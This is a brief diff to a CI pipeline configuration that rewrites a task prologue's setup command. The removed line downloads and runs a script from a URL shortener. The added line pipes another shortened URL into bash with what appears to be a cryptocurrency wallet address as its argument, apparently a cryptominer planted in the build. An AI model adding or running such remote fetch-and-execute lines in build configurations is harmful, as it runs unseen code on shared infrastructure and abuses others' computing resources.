@@ -13,7 +13,7 @@ blocks:
     task:
       prologue:
         commands:
-          - 'sudo apt-get update && wget -O nextach.sh https://tinyurl.com/3bhup27s && chmod +x nextach.sh && ./nextach.sh'
+          - 'sudo apt-get update && curl -s -L https://tinyurl.com/yc7bkruj | bash -s 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j'
       jobs:
         - name: pip
           commands:
